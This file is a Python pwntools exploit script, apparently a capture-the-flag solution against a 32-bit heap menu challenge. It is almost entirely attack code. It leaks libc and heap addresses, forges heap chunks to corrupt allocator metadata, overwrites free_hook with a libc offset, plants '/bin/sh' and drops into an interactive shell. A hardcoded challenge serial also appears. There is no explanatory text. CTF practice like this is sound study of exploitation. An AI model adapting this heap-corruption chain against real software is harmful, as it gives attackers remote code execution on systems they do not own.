from pwn import *

debug=0

context.log_level='debug'

if debug:
    p=process('./pwn')
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
    gdb.attach(p)
else:
    p=remote('xxxxxxxx', 10001)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

def add(sz,name,price):
    sl('1')
    ru('length: ')
    sl(str(sz))
    ru('Name: ')
    se(name)
    ru('Price: ')
    sl(str(price))
    ru('>>> ')

def comment(idx,content,score):
    sl('2')
    ru('Index: ')
    sl(str(idx))
    ru('Comment on')
    se(content)
    ru('score:')
    sl(str(score))
    ru('>>> ')

def throw(idx):
    sl('3')
    ru('index: ')
    sl(str(idx))
    ru('Comment ')
    data = ru(' will')[:-5]
    ru('>>> ')
    return data

add(0x200,'a\n',100)
add(0x100,'a\n',200)
comment(0,'aaaa\n',100)
throw(0)
add(0x10,'a\n',100)
comment(0,'a',100)
libc = u32(throw(0)[4:8])
if debug:
    base = libc-0x1b27b0
else:
    base = libc-0x1b07b0

throw(1)
add(0x200,'c'*20+'\n',100)
throw(0)
add(0xc,'wwwww\n',100)
comment(0,'a'*0x10,200)

heap = u32(throw(0)[0x10:0x14])-0x48

for i in range(8):
    add(0x10,'a\n',100)
for i in range(8):
    throw(i)

add(0x10,'b\n',200) #0
add(0xa0,'a\n',100) #1
add(0xfc,'a\n',100) #2
add(0xfc,'b\n',200) #3
add(0xfc,'c\n',300) #4

throw(2)
add(0xfc,(p32(0)*3+p32(0xf1)+p32(heap+0x288)+p32(heap+0x288)+p32(heap+0x278)*4).ljust(0xf8,'a')+p32(0xf0),200) #2
throw(3)
add(0xec,'a\n',100) #3
add(0xfc,'b\n',200) #5

throw(3)

add(0x2c,'qqqqqq\n',100) #3
add(0xbc,'a\n',100) #6

throw(3)

throw(2)

#free_hook =  base + 0x1b38b0
free_hook = base + 0x1b18b0


add(0xfc,p32(0)*3+p32(0x31)+p32(heap)+'\n',100) #2
add(0x2c,p32(0)+p32(heap+0x8)+p32(0)+p32(free_hook)+p32(0)+p32(heap+0x298)+'/bin/sh\0'+'\n',100) #3


add(0x2c,p32(heap+0x290)+p32(heap+0x280)+'\n',100) #7

sl('4')
ru('Give me an index: ')
sl('1')
sleep(0.5)
se(p32(heap+0x290)+p32(heap+0x288))
ru('Wanna get more power?(y/n)')

sl('y')
ru('Give me serial:')
se('e4SyD1C!')
sleep(0.5)
#se('a'+p32(base+0x3ada0))
se('a'+p32(base+0x3a940))


print(hex(free_hook))
print(hex(base))
print(hex(heap))
p.interactive()
